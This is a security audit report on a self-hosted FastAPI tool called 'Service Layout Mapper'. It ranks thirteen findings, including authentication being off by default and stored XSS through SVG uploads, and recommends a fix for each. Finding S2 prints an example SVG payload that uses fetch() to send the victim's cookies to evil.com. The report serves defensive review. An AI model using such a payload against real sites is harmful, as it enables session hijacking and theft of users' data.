# Security Audit — Service Layout Mapper

**Date:** 2026-02-27  
**Auditor:** Antigravity  
**Scope:** Full backend and frontend codebase  
**Classification:** Internal / Development Use

---

## Executive Summary

The application is a **low-exposure internal tool** designed for self-hosted, trusted-network deployment. No critical remote-code-execution or injection vulnerabilities were found. However, several **medium-severity design issues** exist that become serious if the service is ever exposed to the public internet or a less-trusted LAN. Two findings in particular—**auth bypass by default** and **SVG upload XSS**—should be addressed before any external exposure.

---

## Findings

### 🔴 HIGH — S1: Authentication is Opt-In (Off by Default)

**File:** `backend/app/core/security.py` · `require_write_auth()`  
**Lines:** 88–95

```python
def require_write_auth(...):
    cfg = get_or_create_settings(db)
    if cfg.auth_enabled and user_id is None:   # ← only enforced when auth_enabled = True
        raise HTTPException(status_code=401, ...)
```

All write endpoints (`POST`, `PATCH`, `DELETE`, `PUT`) use `require_write_auth`, which only enforces authentication when `auth_enabled = True` in the database. By default this flag is `False`, meaning **every destructive API and the admin backup/import endpoint is completely open** to any network client that can reach port 8000.

**Impact:** Any user on the same network can wipe the entire database via `POST /api/v1/admin/import` with `wipe_before_import: true`, export all data, create/delete all entities.

**Recommendation:**

- For production deployments, require the administrator to explicitly enable auth **before** the service is accessible on the network.
- Document this clearly in the `README`. Consider alerting in the UI if auth is disabled and the app is not on localhost.
- Consider defaulting `auth_enabled = True` with a first-run setup wizard.

---

### 🔴 HIGH — S2: SVG Upload Allows Stored XSS

**File:** `backend/app/api/compute_units.py` · `upload_icon()`  
**Lines:** 66–107

SVG files are explicitly allowed (`image/svg+xml`) and the magic-byte check is intentionally skipped for SVGs because they are text/XML. Uploaded SVGs are written verbatim to disk and served from `/user-icons/<slug>` as static files served by FastAPI's `StaticFiles`.

A malicious SVG such as:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.com?c='+document.cookie)</script>
</svg>
```

will execute JavaScript in the browser of any user who loads the icon if the `Content-Type` served is `image/svg+xml`. FastAPI's `StaticFiles` infers the MIME type from the file extension (`.svg → image/svg+xml`), meaning modern browsers **will** execute the embedded script.

**Impact:** Stored XSS — anyone with write access (or anyone, if S1 is unmitigated) can inject persistent JavaScript into all other users' sessions.

**Recommendation:**

1. Either reject SVG uploads entirely in favour of PNG/WebP only.
2. Or, if SVG is required, sanitize the SVG content with a library such as `nh3` (Rust-backed, fast) or `bleach` before saving.
3. Set `Content-Security-Policy: default-src 'none'` header when serving the `/user-icons` path, or serve user uploads from a separate domain/subdomain without cookies.
4. Optionally add a `Content-Disposition: attachment` header so browsers download rather than render SVGs.

---

### 🟠 MEDIUM — S3: `recent-changes` Endpoint Has No Authentication

**File:** `backend/app/api/admin.py` · `recent_changes()`  
**Lines:** 244–269

The `/api/v1/admin/recent-changes` endpoint does **not** use `require_write_auth` or any authentication dependency. It exposes the names, IDs, and timestamps of all recently modified entities to unauthenticated callers, even when `auth_enabled = True`.

**Impact:** Information disclosure — adversary can enumerate all entity names and IDs without credentials.

**Recommendation:** Add `_=Depends(require_write_auth)` to the `recent_changes` function signature, consistent with the rest of the admin router.

---

### 🟠 MEDIUM — S4: CORS Origins Hardcoded to Localhost Only — May Widen in Production

**File:** `backend/app/core/config.py` · **Line 12**

```python
cors_origins: list[str] = ["http://localhost:3000", "http://localhost:5173"]
```

The defaults are safe. However, if an operator sets `CORS_ORIGINS=*` in the environment (a common quick-fix pattern), the server would accept requests from any origin, enabling CSRF attacks against the stateless-JWT endpoints.

**Recommendation:**

- Document that `*` is never acceptable if `auth_enabled = True`.
- Consider validating the `cors_origins` list at startup and logging a warning if it contains `*`.

---

### 🟠 MEDIUM — S5: JWT Stored in SQLite Database, Not in Environment Variable

**File:** `backend/app/db/models.py` · `AppSettings.jwt_secret`

The JWT signing secret is auto-generated and stored in the `app_settings` database table. While the secret is not exposed via the GET `/settings` endpoint (confirmed via test), it means:

1. **Anyone with read access to `data/app.db`** (e.g. via a misconfigured volume mount or container breakout) obtains the JWT secret and can forge arbitrary session tokens.
2. The secret **does not rotate** unless auth is toggled off and on again, providing no forward secrecy.

**Recommendation:**

- Prefer loading the JWT secret from an environment variable (`JWT_SECRET`) at startup, falling back to the DB-stored value only for backward compatibility.
- Document that the `data/` volume should have strict filesystem permissions (mode `700`).

---

### 🟡 LOW — S6: Gravatar Uses MD5

**File:** `backend/app/core/security.py` · `gravatar_hash()`  
**Line:** 35

```python
hashlib.md5(email.strip().lower().encode()).hexdigest()
```

MD5 is cryptographically broken. While the Gravatar service itself uses MD5 by specification, exposing the MD5 hash of a user's email leaks a linkable identifier that can be reversed with rainbow tables or cross-referenced against other Gravatar users.

**Recommendation:** If Gravatar lookups are not critical, consider omitting the `gravatar_hash` from API responses. If kept, document the privacy trade-off.

---

### 🟡 LOW — S7: Profile Photo Upload Has No Magic-Byte Validation

**File:** `backend/app/services/auth_service.py` · `update_profile()`

The icon upload endpoint (`/icons/upload`) performs magic-byte validation server-side. The profile photo upload in `auth_service.update_profile()` does not — it relies solely on the client-declared `Content-Type` and file extension. An attacker could upload a polyglot file (e.g., a JPEG-prefixed PHP file) disguised as an image.

Since files are served as static files by FastAPI (not interpreted by PHP/CGI), the immediate risk is low in this deployment. However, it's inconsistent with the higher-bar validation applied to icon uploads.

**Recommendation:** Apply the same `_verify_magic_bytes()` logic used in `compute_units.py` to profile photo uploads.

---

### 🟡 LOW — S8: `admin/import` Accepts Unbounded JSON Payload

**File:** `backend/app/api/admin.py` · `import_backup()`  
**Lines:** 206–229

The import endpoint accepts a `data: dict[str, Any]` payload with no size limit. An adversary (or misconfigured client) could POST a very large JSON document, causing excessive memory allocation.

**Recommendation:** Add `request.app.state`-level body size limiting or validate payload size at the endpoint level. FastAPI does not impose a default request body size limit.

---

### 🟡 LOW — S9: Rate Limiting Only Applied to Auth Endpoints

**File:** `backend/app/api/auth.py` · Lines 18, 25

Rate limiting via `slowapi` is currently only applied to `/register` and `/login`. Computationally expensive endpoints like `/api/v1/graph/topology` (which joins many tables) or `/api/v1/admin/export` (full DB dump) have no rate limiting.

**Recommendation:** Apply rate limiting to the topology and admin export endpoints, e.g. `@limiter.limit("30/minute")`.

---

### 🟡 LOW — S10: Session Tokens Are Not Revocable

**File:** `backend/app/core/security.py`

JWT tokens are verified purely by signature — there is no server-side token store (blocklist/allowlist). Logging out by calling `POST /auth/logout` only signals the client to drop the token; the server-side token remains valid until expiry (`session_timeout_hours`, default 24 h).

If a token is stolen (e.g., via S2 XSS), the only mitigation is to toggle `auth_enabled` off and on, which regenerates the JWT secret and invalidates all sessions.

**Recommendation:**

- For a homelab tool, this trade-off is acceptable; document it clearly.
- If higher assurance is needed, implement a simple server-side token blocklist in SQLite.

---

### 🔵 INFORMATIONAL — S11: Swagger UI Publicly Accessible

**File:** `backend/app/main.py` · **Line 209**

```python
docs_url="/swagger",
redoc_url="/redoc",
```

The OpenAPI documentation UI is accessible to anyone who can reach the server. This exposes the full API surface, request schemas, and example values.

**Recommendation:** In production, disable Swagger: set `docs_url=None, redoc_url=None` or gate it behind auth.

---

### 🔵 INFORMATIONAL — S12: `debug = False` by Default (Correct)

**File:** `backend/app/core/config.py` · **Line 9**

`debug: bool = False` — Correct. FastAPI/uvicorn debug mode should never be enabled in production as it exposes internal tracebacks. This is correctly off by default.

---

### 🔵 INFORMATIONAL — S13: No Pinned Dependency Versions Found

No `requirements.txt` or `pyproject.toml` was found in the backend directory. Dependencies appear to be installed into the Docker image. Without pinned versions, builds may silently pull vulnerable transitive dependency updates.

**Recommendation:** Add a `requirements.txt` or `pyproject.toml` with exact pinned versions and run periodic `pip-audit` or `safety` checks in CI.

---

## Summary Table

| ID  | Severity  | Title                                      | Status        |
| --- | --------- | ------------------------------------------ | ------------- |
| S1  | 🔴 HIGH   | Auth is opt-in; all writes open by default | Open          |
| S2  | 🔴 HIGH   | SVG upload → Stored XSS                    | Open          |
| S3  | 🟠 MEDIUM | `recent-changes` has no auth               | Open          |
| S4  | 🟠 MEDIUM | CORS wildcard risk                         | Informational |
| S5  | 🟠 MEDIUM | JWT secret stored in DB, not env           | Open          |
| S6  | 🟡 LOW    | Gravatar uses MD5                          | Informational |
| S7  | 🟡 LOW    | Profile photo has no magic-byte check      | Open          |
| S8  | 🟡 LOW    | `admin/import` has no payload size limit   | Open          |
| S9  | 🟡 LOW    | Rate limiting only on auth endpoints       | Open          |
| S10 | 🟡 LOW    | JWT tokens non-revocable                   | Accepted Risk |
| S11 | 🔵 INFO   | Swagger UI publicly accessible             | Open          |
| S12 | 🔵 INFO   | `debug=False` by default                   | ✅ Correct    |
| S13 | 🔵 INFO   | No pinned dependency versions              | Open          |

---

## Recommended Fix Priority

1. **Immediately (before any external exposure):** `S1`, `S2`
2. **Soon:** `S3`, `S5`, `S7`
3. **Backlog:** `S8`, `S9`, `S11`, `S13`
4. **Accept & document:** `S4`, `S6`, `S10`
